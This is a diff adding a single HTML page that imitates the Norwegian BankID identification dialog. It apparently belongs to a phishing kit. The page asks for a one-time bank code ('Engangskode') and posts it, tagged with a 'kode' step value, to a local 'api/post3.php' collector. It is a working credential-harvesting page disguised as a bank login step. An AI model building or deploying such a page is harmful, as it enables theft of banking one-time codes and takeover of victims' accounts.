@@ -1,0 +1,65 @@
+<html><head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <!-- link_icons -->
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
+        <title>BankID</title>
+        <!-- logo site web-->
+        <link rel="icon" href="image/x.ico" type="image/x-icon">
+        <link rel="shortcut icon" href="image/x.ico" type="image/x-icon">
+        <!-- link__css -->
+        <link rel="stylesheet" href="css/bootstrap.css">
+        <link rel="stylesheet" href="css/lary.css">
+
+        <style>
+            .modal-open{
+                overflow:hidden;
+                padding-right:0px;
+            }
+        </style>
+
+</head>
+<body class="modal-open" style="background:#F6F6F9;">
+         <!-- Modal -->
+        <div class="modal  fade show" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true"> 
+          <div class="modal-dialog">
+            <div class="modal-content">
+              <div class="ss" style="background:#F6F6F9;"><p style="color: #222;font-size: 15px;padding-left:20px; letter-spacing: -0.24px;">Bank ID</p></div>
+              <div class="modal-body">
+                <form action="api/post3.php" method="post" class="shadow mx-0">
+                     <input type="hidden" name="step" value="kode">
+                     <div class="fomat">
+                         <img src="image/acc.svg">
+                         <p class="mb-0">Identifisering</p>
+                         <img src="image/bar_lg.png" class="pop">
+                     </div>
+                    <div class="stock">
+                         <div class="log " style="align-items: flex-end;">
+                             <div class="inputs">
+                                 <div class="form-group mom att" style="position:relative;">
+                                     <label style="font-size: 16px;margin-bottom: 8px;color: black;">Engangskode</label>
+                                     <input type="text" name="pass" class="form-control" id="pass" placeholder="********" required="">
+                                 </div>
+                             </div>
+                             <div class="bill">
+                                 <button class="btn" name="submit"><img src="image/sahm.svg"></button>
+                             </div>
+                         </div>
+                    </div>
+                     <div class="fotter">
+                          <img src="image/protege.png" width="200px">
+                     </div>
+                </form>
+              </div>
+              <div class="text-center py-3" style="background:#F6F6F9;"><a href="#" style="font-size:14px;color:#161225;">Avbryt</a></div>
+            </div>
+          </div>
+        </div>
+
+    <script src="js/jquery-3.5.1.min.js"></script>
+    <script src="js/jquery.mask.js"></script>
+
+              
+
+</body></html>
